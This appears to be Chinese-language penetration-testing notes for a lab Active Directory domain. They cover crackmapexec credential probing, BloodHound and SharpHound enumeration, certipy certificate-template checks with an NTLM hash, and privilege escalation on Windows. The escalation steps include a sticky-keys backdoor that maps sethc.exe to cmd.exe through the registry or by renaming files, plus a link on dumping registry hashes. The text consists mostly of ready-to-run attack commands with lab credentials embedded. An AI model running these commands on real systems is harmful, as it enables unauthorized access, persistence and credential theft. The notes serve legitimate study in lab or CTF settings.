
* 有账户时批量探测  `proxychains crackmapexec smb 172.22.17.6 -u chen -p chen@0813`

# 进入域后, 某一点攻击成功后, bloodhound

```sh
proxychains bloodhound-python -d xiaorang.lab -u yangdming -p kier@n10 -gc dc.xiaorang.lab -c all
## 或 SharpHound
SharpHound.exe --ldapusername yangdming --ldappassword kier@n10 -c all
```

配置一下hosts：

```sh
172.22.61.17 xiaorang.lab
172.22.61.17 dc.xiaorang.lab
```

### certipy 证书探测

```sh
proxychains certipy find -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -dc-ip 172.22.61.17 -vulnerable
cat 20231030050124_Certipy.txt
```

## 常见提权

* 启动项提权, addUser.bat

###  SeRestorePrivilege提权
[卷影拷贝](https://mp.weixin.qq.com/s/4RahZ2ZXXL1jIpZm-QifMg)

参考https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8

```sh
# 开启粘滞键
## M1.
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

## M2.
cd C:\windows\system32
ren sethc.exe sethc.bak
ren cmd.exe   sethc.exe
## 锁定用户，在登录处shift 5次触发粘滞键
```
## SeBackupPrivilege 提权
[卷影拷贝](https://mp.weixin.qq.com/s/4RahZ2ZXXL1jIpZm-QifMg)

* [注册表导出-hash](../14_credential_mimikatz.md#注册表导出-hash)
